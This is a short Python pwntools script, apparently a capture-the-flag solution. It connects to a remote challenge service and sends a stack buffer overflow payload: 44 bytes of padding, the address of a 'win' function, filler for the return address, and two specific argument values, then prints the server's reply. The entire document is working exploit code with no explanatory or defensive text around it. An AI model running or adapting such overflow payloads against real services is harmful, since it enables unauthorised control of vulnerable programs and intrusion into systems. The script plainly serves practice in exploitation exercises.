from pwn import *


f = remote('sbo01.westus2.azurecontainer.io', 8080)


win_addr = p32(0x8049276)
arg1 = p32(0x1337c0d3)
arg2 = p32(0xacc01ade)


f.recvline()

f.sendline((b'a' * 44) + win_addr + (b'a' * 4)  + arg1 + arg2)

print(f.recvline())
